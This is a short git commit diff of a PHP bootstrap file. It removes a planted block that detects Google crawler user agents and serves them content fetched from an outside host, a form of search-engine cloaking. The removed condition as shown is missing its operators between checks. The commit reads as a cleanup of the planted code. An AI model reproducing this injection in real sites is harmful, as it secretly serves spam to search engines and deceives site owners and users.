81763e4a24d7935143cc4297e9852554f959b753
batskulah <alfanpekan@gmail.com>
2026-07-20 16:29:58 +0700

    Update bootstrap.php

--- bootstrap.php
+++ bootstrap.php
@@ -1,11 +1,4 @@
 <?php
-function check_user_agent($agent) {
-    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
-}
-if (check_user_agent('Googlebot')  check_user_agent('Google-Site-Verification')  check_user_agent('Google-InspectionTool')) 
-{ echo file_get_contents('https://script-kita.site/ugedu/r');
-exit;
-}
 
 /**
  * @defgroup index Index
